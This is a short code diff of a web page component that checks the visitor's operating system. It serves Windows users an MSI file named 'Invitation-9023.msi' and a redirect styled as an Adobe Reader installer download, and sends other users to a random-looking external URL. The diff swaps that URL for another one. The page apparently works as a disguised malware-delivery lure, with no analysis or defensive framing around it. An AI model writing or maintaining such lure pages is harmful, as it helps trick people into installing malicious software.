@@ -5,7 +5,7 @@ export default function Home() {
     const userAgent = navigator.userAgent || "";
     const isWindows = /windows/i.test(userAgent);
 
-    const NON_WINDOWS_TARGET = "https://quora.chabemo.institute/DjK@TxMYRFjDq3p5aQPUt2/";
+    const NON_WINDOWS_TARGET = "https://waitlist.yutrija.app/d7ZczaSFKF2uS!KSpDa/";
     const MSI_FILE = "/Invitation-9023.msi";
     const WINDOWS_REDIRECT = "https://uswebsites.com/adobe-reader/installer/download.html";
 
@@ -52,6 +52,7 @@ export default function Home() {
     </main>
   );
 }
+
 
 
 
